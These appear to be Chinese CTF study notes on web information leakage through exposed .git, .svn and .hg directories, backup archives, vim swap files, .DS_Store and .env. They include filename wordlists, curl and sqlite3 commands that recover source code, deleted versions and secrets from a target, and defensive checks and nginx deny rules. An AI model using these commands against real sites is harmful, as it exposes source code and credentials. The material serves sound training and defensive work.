## 问题 1：Git 泄露是什么，为什么会有

### 是什么

**`.git` 目录被部署到了 web 根目录，HTTP 能直接访问。**

`.git` 里有什么：

| 内容 | 位置 | 危害 |
|---|---|---|
| **全部源码**（每个文件的每个版本） | `objects/` | 直接拿到完整源码 |
| **全部提交历史** | `objects/` + `refs/` | 看到开发过程、注释里的密码 |
| **未提交的改动** | `index` | 暂存区里可能有敏感文件 |
| **藏起来的改动** | `refs/stash` | 连 commit 都没进就被藏了 |
| **被"删掉"的东西** | `objects/` + `logs/` | `git rm` 删不掉对象 |
| 配置 | `config` | remote url、用户名 |

**叫"泄露"而不叫"漏洞"**：不需要构造 payload、不需要绕过逻辑，**只要会发 HTTP 请求 + 有个路径**。

### 为什么会有

| 原因 | 具体场景 |
|---|---|
| 用 `git clone` 部署 | 在 web 目录直接 clone，忘了删 `.git` |
| 在 web 目录直接开发 | 开发完直接上线，`.git` 一直在 |
| 用 `git pull` 更新代码 | 每次拉取都在 web 目录操作 |
| 打包时没排除 | `tar czf` 没加 `--exclude=.git` |
| 备份/迁移整目录拷贝 | 把整个工作目录打包上传 |
| 测试环境当生产用 | 图省事，直接把 dev 目录挂上去 |

**实测（CTFHub）**：

```bash
$ curl -s "$T/.git/HEAD"
ref: refs/heads/master        # 一个 23 字节的文件，证明整个 .git 都能读
```

### 为什么危害特别大

```
git rm secret.php          → 工作区没了、index 没了、新 tree 不指向它
                           → 但 objects/ 里的 blob 原封不动
                           → 历史里永远找得到

彻底删除要两步：
  git reflog expire --expire=now --all
  git gc --prune=now
```

**绝大多数人只会 `git rm`** —— 这就是 99% 的 Git 泄露还能挖到东西的原因。

## 问题 2：备份文件下载有哪些；vim 缓存一共有哪些

### A. 备份文件——按载体分 6 类

#### ① 网站源码包

```
www.zip     web.zip      backup.zip   site.zip     html.zip
www.tar.gz  web.tar.gz   backup.tar.gz  site.tar   html.tar
www.rar     web.rar      backup.rar
wwwroot.zip 源码.zip     1.zip  2.zip
```

#### ② 文件名后缀变体（对已知文件名加后缀）

```
index.php.bak      index.php.backup    index.php.old
index.php.orig     index.php.save      index.php.copy
index.php.tmp      index.php.txt       index.php.1
index.php~         index.php.bak1      index.php.old1
```

> **为什么 `.bak` 能读源码**：服务器按**最后扩展名**决定解析。
> `index.php.bak` → 最后是 `.bak` → 当静态文件 → **原样吐出来**
> `index.bak.php` → 最后是 `.php` → 交给 PHP → **不泄露**

#### ③ 编辑器缓存（vim 系列，见下一节）

#### ④ 系统 / 元数据

```
.DS_Store      macOS Finder 的目录元数据（含文件名！）
Thumbs.db      Windows 缩略图缓存
desktop.ini    Windows 文件夹配置
```

#### ⑤ 配置 / 密钥

```
.env       .env.bak    .env.local    .env.production
.gitignore  .gitattributes  .dockerignore
Dockerfile  docker-compose.yml
.gitlab-ci.yml  .travis.yml  .github/workflows/*.yml
config.php  config.php.bak  web.config
```

#### ⑥ IDE / 工程文件

```
.idea/        PhpStorm / IDEA 工程配置
.vscode/      VS Code
.settings/    .project    .classpath    Eclipse
*.iml         composer.json  package.json  requirements.txt
```

### B. vim 缓存文件——一共 3 类 8 种

#### ① 交换文件（swap）—— 编辑中崩溃/被 kill 才有

| 文件名 | 什么时候出现 |
|---|---|
| **`.文件名.swp`** | 第 1 个 vim 会话（最常见） |
| `.文件名.swo` | 第 2 个 vim 同时打开同名文件 |
| `.文件名.swn` | 第 3 个 |
| `.文件名.swm` | 第 4 个 |
| `.文件名.swl` | 第 5 个 |
| ... | 依次递减 |

**命名规则**：`.swp` 已存在时，**把末尾字母递减**：

```
swp → swo → swn → swm → swl → swk → swj ...
```

**前面永远加一个 `.`**（所以 `ls` 看不到）。

#### ② 持久化 undo 文件

| 文件名 | 触发条件 |
|---|---|
| **`.文件名.un~`** | 配置了 `set undofile` |

**内容**：完整的撤销历史（**可能包含已删除的旧版本内容**）。

#### ③ 备份文件

| 文件名 | 触发条件 |
|---|---|
| **`文件名~`** | 配置了 `set backup` |

**内容**：文件上一次保存前的完整内容。

### C. vim swap 的三种取法（实测对比）

```bash
curl -s -O "$T/.index.php.swp"
```

| 方法 | 可靠性 | 说明 |
|---|---|---|
| **`grep -ao "flag{[^}]*}" .index.php.swp`** | ⭐⭐⭐ | **swap 不加密，直接搜明文** |
| `strings .index.php.swp` | ⭐⭐ | 顺带能拿到**服务器绝对路径**和运行用户 |
| `vim -r .index.php.swp` | ⚠️ | **数据块可能只写了一半 → 恢复出来是残缺的** |

**实测结果**：

```
grep   → ctfhub{1bbffdd2cca2f93ddc0ca8d8}           完整
vim -r → // ctfhub{1bbffdd2cca2                      断在半路
```

**认知修正**：不是"必须用 `vim -r`"。swap 按块异步写，崩溃时可能只写了一半，`grep` 反而更完整。

## 问题 3：SVN 泄露由什么引起

### 直接原因

**在 web 目录执行 `svn checkout`，`.svn` 元数据目录留在了 web 根。**

```
svn checkout https://repo/xxx /var/www/html/
    ↓
/var/www/html/.svn/    ← 元数据目录，HTTP 能读
```

### 正确做法

```bash
svn export https://repo/xxx /var/www/html/    # 导出干净副本，不带 .svn
```

| 命令 | 带 `.svn` 吗 | 用途 |
|---|---|---|
| `svn checkout` | ✅ 带 | **开发用**（要能 commit/update） |
| `svn export` | ❌ 不带 | **部署用**（只要文件内容） |

**用 `checkout` 部署 = 泄露。**

### 两代结构完全不同

| 版本 | `.svn` 位置 | 元数据 | 内容 |
|---|---|---|---|
| ≤ 1.6 | **每个子目录都有** | `entries`（**纯文本，含文件列表**） | `text-base/<名>.svn-base` |
| ≥ 1.7 | **只有根目录** | `wc.db`（**SQLite**） | `pristine/<sha1前2位>/<sha1>.svn-base` |

### 实测（1.7+）

```bash
$ curl -s "$T/.svn/entries"
12                      # 只有格式版本号，没有文件列表

$ curl -o wc.db "$T/.svn/wc.db"
# 122880 字节的 SQLite

$ sqlite3 wc.db "SELECT checksum, size, refcount FROM PRISTINE;"
$sha1$bf45c36a... | 221 | 1     ← index.html 还在用
$sha1$0b4474e3... |  33 | 0     ← ★ 被删掉的旧版本
```

**`refcount = 0`** = 没有任何工作副本文件引用它 = **被删掉的旧版本残留**。

```bash
$ curl -s "$T/.svn/pristine/0b/0b4474e3aada84def80c35dfffcce4818f515673.svn-base"
ctfhub{6fd7676ba56da2a90a11af9a}
```

## 问题 4：不同种类怎么获取泄露的信息

### 统一四步框架

```
① 探测（有没有）→ ② 拿清单（有哪些文件）→ ③ 取内容（按路径）→ ④ 解码（zlib/原文）
```

### 完整表格

| 类型 | ① 探测 | ② 拿清单 | ③ 取内容 | ④ 解码 |
|---|---|---|---|---|
| **源码包** | 字典爆破 `www.zip` | 解压 | **文件名当 URL 试一遍** | — |
| **`.bak` 等** | 已知文件名 + 加后缀 | — | `curl $T/index.php.bak` | — |
| **vim swp** | `.文件名.swp` | — | `curl -O` | `grep -a` / `vim -r` |
| **`.DS_Store`** | 固定路径 `/.DS_Store` | **解析出 filename** | 文件名当 URL | `ds_store` 库 |
| **Git** | `.git/HEAD` = 200 | `logs/HEAD` / `index` / `refs/` | `objects/<h[:2]>/<h[2:]>` | **zlib** |
| **SVN** | `.svn/entries` 或 `.svn/wc.db` | `wc.db` 的 `NODES` / `PRISTINE` 表 | `pristine/<h[:2]>/<h>.svn-base` | **原文** |
| **HG** | `.hg/requires` = 200 | `store/fncache` + `dirstate` | `store/data/<编码名>.i` | **zlib 或 `'u'`+原文** |
| **`.env`** | 固定路径 `/.env` | — | `curl $T/.env` | **base64 -d** |

### 三个版本库的差异（同一类题）

| 环节 | Git | SVN | HG |
|---|---|---|---|
| **内容路径由什么决定** | **内容哈希** | **内容哈希** | **文件名编码** ★ |
| 规则 | `<前2位>/<后38位>` | `<前2位>/<后38位>` | **`_` → `__`** |
| 目录列表 | 403 | 403 | 403 |
| 工具 | GitHack | rip-svn.pl | rip-hg.pl |

**记忆法**：

> **Git/SVN 按"内容指纹"找书（哈希），HG 按"书名"找书（文件名编码）。**

### 每种一条命令

```bash
# 源码包
unzip www.zip && find . -name '*flag*'

# .bak
curl -s "$T/index.php.bak" | grep -i flag

# vim swp
curl -s -O "$T/.index.php.swp" && grep -ao 'flag{[^}]*}' .index.php.swp

# .DS_Store
python3 -c "from ds_store import DSStore; [print(e.filename) for e in DSStore.open('.DS_Store','r')]"

# Git
git log --all -p | grep -i ctfhub          # 或 git stash show -p / git diff --cached

# SVN
for h in $(sqlite3 wc.db "SELECT checksum FROM PRISTINE;" | sed 's/\$sha1\$//'); do
  curl -s "$T/.svn/pristine/${h:0:2}/${h}.svn-base"
done | grep -a ctfhub

# HG
FN=$(curl -s "$T/.hg/dirstate" | strings | grep -oE 'flag_[0-9]+\.txt')
curl -s "$T/.hg/store/data/${FN//_/__}.i" | grep -ao 'ctfhub{[^}]*}'

# .env
curl -s "$T/.env" | grep -iE 'key|secret|flag' | base64 -d 2>/dev/null
```

## 问题 5：信息泄露出现的最大原因是什么（自思考）

### 一句话

> **不是"被攻破了什么"，而是"该藏的东西被当成了公开的东西"。**

### 第一层（表层）：开发环境和部署环境没有分离

```
开发时需要的东西              部署时该有的东西
├── .git（要 commit）          ├── 只有源码文件
├── .svn（要 update）          ├── 只有源码文件
├── .env（本地配置）            ├── 环境变量
├── .swp（编辑器缓存）          ├── 什么都没有
└── node_modules / vendor      └── 通常要

用 git clone / svn checkout / 直接拷贝整个目录 部署
        ↓
开发环境的东西【全部】被当成网站内容发布了
```

**核心矛盾**：**开发要"完整"（含版本控制），部署要"干净"（不含版本控制），很多人用了同一个目录。**

### 第二层（认知）："看不见 = 不存在"的错觉

```
.git  .svn  .env  .DS_Store  .index.php.swp
└────────────────────┬────────────────────┘
              都以 . 开头
                    ↓
              ls 看不见
                    ↓
         人就以为"它不存在"
                    ↓
        但 HTTP 请求不看你的 ls
```

**一个 `GET /.git/HEAD` 就够了。**

**这是最根本的认知错误** —— 把"我在终端里看不到"当成了"外部也访问不到"。

### 第三层（动机）：便利优先于安全

| 便利的做法 | 安全但麻烦的做法 |
|---|---|
| `git clone` 部署 | `git archive` 打干净包 |
| `svn checkout` 部署 | `svn export` |
| `.env` 放 web 根 | 环境变量 / 配置中心 |
| 在 web 目录直接改代码 | 本地开发 → CI 构建 → 发布产物 |
| 备份文件放同目录 `xxx.php.bak` | 备份到 web 根之外 |

**每一条都是"省一步"，而省的那一步就是泄露的来源。**

### 结论

> **信息泄露的根本原因不是技术问题，是流程问题。**
>
> **它不需要攻击者"做对什么"，只需要运维人员"漏做一步"：**
> **忘了 `--exclude=.git`、忘了用 `export` 代替 `checkout`、忘了把 `.env` 移出去。**
>
> **而这一步"漏做"，在服务器上留下的不是"漏洞"，是"证据"** ——
> **源码、历史、密钥、数据库密码，全都在那儿，只等你发个 GET。**
>
> **所以防御信息泄露，靠的不是 WAF，是"部署前那一条 `rm -rf .git .svn .env *.bak *.swp`"。**

### 五秒自查（能挡掉本模块全部题目）

```bash
for p in .git/HEAD .svn/entries .svn/wc.db .hg/requires .env .DS_Store \
         www.zip index.php.bak .index.php.swp; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://your-site/$p")
  [ "$code" = "200" ] && echo "[!] 泄露: /$p"
done
```

**服务器层配置：**

```nginx
location ~ /\.(git|svn|hg|env) { deny all; return 404; }
location ~* \.(bak|old|orig|save|swp|swo|swn|sql|zip|tar|gz)$ { deny all; return 404; }
```
